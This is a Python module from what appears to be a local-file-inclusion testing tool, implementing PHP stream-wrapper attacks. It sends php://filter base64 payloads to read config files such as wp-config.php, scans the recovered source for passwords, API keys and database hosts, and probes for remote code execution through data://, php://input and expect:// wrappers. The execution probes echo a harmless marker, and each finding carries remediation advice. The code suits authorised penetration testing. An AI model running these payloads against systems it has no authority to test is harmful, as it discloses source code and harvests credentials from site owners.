"""
PHP wrapper techniques.

PHP stream wrappers turn a plain file-read primitive into much more:

* ``php://filter`` with a base64 encoder reads *source code* that would
  otherwise be executed — the classic way to exfiltrate ``config.php`` and
  hunt for credentials.
* ``data://``, ``php://input`` and ``expect://`` can turn inclusion into
  remote code execution when ``allow_url_include`` (or ``expect``) is enabled.

Source disclosure is always attempted (safe, high value). The RCE wrappers are
only attempted when ``--rce`` is set, and use a benign, uniquely-marked probe
so a positive result proves execution without dropping a real payload.
"""
from __future__ import annotations

import base64
import re
import secrets
from typing import Iterator, List, Optional

from lfimachine.core import detector
from lfimachine.core.result import Finding, Severity
from lfimachine.payloads import signatures
from lfimachine.techniques.base import Technique, TechniqueContext

# A candidate list of application source files worth disclosing once PHP is known.
_SOURCE_TARGETS = [
    "index.php",
    "config.php",
    "configuration.php",
    "wp-config.php",
    "db.php",
    "database.php",
    "settings.php",
    "../config.php",
    "../../config.php",
    "includes/config.php",
]


def _echo_marker() -> str:
    return "LFIMX" + secrets.token_hex(4)


class WrapperSourceTechnique(Technique):
    name = "php-filter-source"
    description = "php://filter base64 source disclosure"
    priority = 90

    def applicable(self, ctx: TechniqueContext) -> bool:
        # Worth trying whenever PHP is plausible.
        return ctx.fingerprint.php or ctx.fingerprint.language in (None, "php")

    def run(self, ctx: TechniqueContext) -> Iterator[Finding]:
        log = ctx.logger
        for target in _SOURCE_TARGETS:
            payload = f"php://filter/convert.base64-encode/resource={target}"
            resp = ctx.point.send(ctx.client, payload)
            if not resp.ok or resp.status_code != 200:
                continue

            decoded = self._extract_b64_php(resp.text)
            if decoded is None:
                continue

            log.good(
                f"Source disclosure via {self.name}: {target} "
                f"({len(decoded)} bytes of PHP recovered)"
            )
            preview = decoded[:200].replace("\n", "\\n")
            creds = self._sniff_secrets(decoded)
            yield Finding(
                technique=self.name,
                title=f"PHP source disclosure — {target}",
                severity=Severity.HIGH if not creds else Severity.CRITICAL,
                confidence=0.9,
                url=resp.url or ctx.point.url,
                parameter=ctx.point.parameter or "<path>",
                method=ctx.point.method,
                payload=payload,
                encoder="plain",
                evidence=preview,
                matched_signatures=["php_open_tag"],
                os_guess=ctx.os_confirmed,
                status_code=resp.status_code,
                response_length=resp.length,
                remediation=(
                    "Disable dangerous PHP stream wrappers where possible and "
                    "never include user-controlled paths. Move secrets out of "
                    "web-served source files."
                ),
                extra={
                    "recovered_bytes": len(decoded),
                    "secrets_found": creds,
                },
            )

    @staticmethod
    def _extract_b64_php(body: str) -> Optional[str]:
        # The base64 blob is usually the dominant token in the response body.
        candidates = re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", body)
        for blob in sorted(candidates, key=len, reverse=True):
            try:
                raw = base64.b64decode(blob, validate=True)
            except Exception:
                continue
            text = raw.decode("utf-8", errors="replace")
            if "<?php" in text or "<?=" in text or re.search(r"\$\w+\s*=", text):
                return text
        return None

    @staticmethod
    def _sniff_secrets(source: str) -> List[str]:
        found: List[str] = []
        patterns = {
            "db_password": r"(?:pass(?:word)?|pwd)\s*[=:]\s*['\"]([^'\"]{3,})['\"]",
            "db_user": r"(?:user(?:name)?|db_user)\s*[=:]\s*['\"]([^'\"]{2,})['\"]",
            "api_key": r"(?:api[_-]?key|secret|token)\s*[=:]\s*['\"]([^'\"]{8,})['\"]",
            "db_host": r"(?:host|db_host|DB_HOST)\s*[=:]\s*['\"]([^'\"]{3,})['\"]",
        }
        for name, pat in patterns.items():
            if re.search(pat, source, re.IGNORECASE):
                found.append(name)
        return found


class WrapperRceTechnique(Technique):
    name = "wrapper-rce"
    description = "data:// , php://input and expect:// code execution"
    priority = 40
    requires_inclusion = False

    def applicable(self, ctx: TechniqueContext) -> bool:
        return ctx.rce and (ctx.fingerprint.php or ctx.fingerprint.language in (None, "php"))

    def run(self, ctx: TechniqueContext) -> Iterator[Finding]:
        log = ctx.logger
        yield from self._try_data_wrapper(ctx, log)
        yield from self._try_php_input(ctx, log)
        yield from self._try_expect(ctx, log)

    def _confirm_echo(self, resp, marker: str) -> bool:
        # A successful, evaluated `echo MARKER;` returns the bare marker but NOT
        # the surrounding PHP tags (those would appear if code was not executed).
        return (
            resp.ok
            and marker in resp.text
            and "<?php" not in resp.text.split(marker)[0][-30:]
        )

    def _finding(self, ctx, resp, payload, marker, vector) -> Finding:
        return Finding(
            technique=self.name,
            title=f"Remote Code Execution via {vector}",
            severity=Severity.CRITICAL,
            confidence=0.95,
            url=resp.url or ctx.point.url,
            parameter=ctx.point.parameter or "<path>",
            method=ctx.point.method,
            payload=payload,
            evidence=f"executed echo returned marker {marker}",
            matched_signatures=[],
            os_guess=ctx.os_confirmed,
            status_code=resp.status_code,
            response_length=resp.length,
            remediation=(
                "Disable allow_url_include and the expect extension; never "
                "include user-controlled input."
            ),
            extra={"vector": vector, "code_exec": True},
        )

    def _try_data_wrapper(self, ctx, log) -> Iterator[Finding]:
        marker = _echo_marker()
        php = f"<?php echo '{marker}'; ?>"
        b64 = base64.b64encode(php.encode()).decode()
        for payload in (
            f"data://text/plain;base64,{b64}",
            f"data://text/plain,{php}",
        ):
            resp = ctx.point.send(ctx.client, payload)
            if self._confirm_echo(resp, marker):
                log.good(f"RCE confirmed via data:// wrapper on {ctx.point.describe()}")
                yield self._finding(ctx, resp, payload, marker, "data:// wrapper")
                return

    def _try_php_input(self, ctx, log) -> Iterator[Finding]:
        if ctx.point.location not in ("query", "path"):
            return
        marker = _echo_marker()
        body = f"<?php echo '{marker}'; ?>"
        # php://input requires the payload in the raw POST body.
        url = ctx.point.url
        params = dict(ctx.point.base_params)
        if ctx.point.location == "query":
            params[ctx.point.parameter] = "php://input"
        else:
            url = url.replace("FUZZ", "php://input")
        resp = ctx.client.request(
            "POST", url, params=params or None, data=body.encode(),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        if self._confirm_echo(resp, marker):
            log.good(f"RCE confirmed via php://input on {ctx.point.describe()}")
            yield self._finding(ctx, resp, "php://input (body=<?php echo...)", marker,
                                "php://input wrapper")

    def _try_expect(self, ctx, log) -> Iterator[Finding]:
        marker = _echo_marker()
        payload = f"expect://echo {marker}"
        resp = ctx.point.send(ctx.client, payload)
        if resp.ok and marker in resp.text:
            log.good(f"RCE confirmed via expect:// on {ctx.point.describe()}")
            yield self._finding(ctx, resp, payload, marker, "expect:// wrapper")
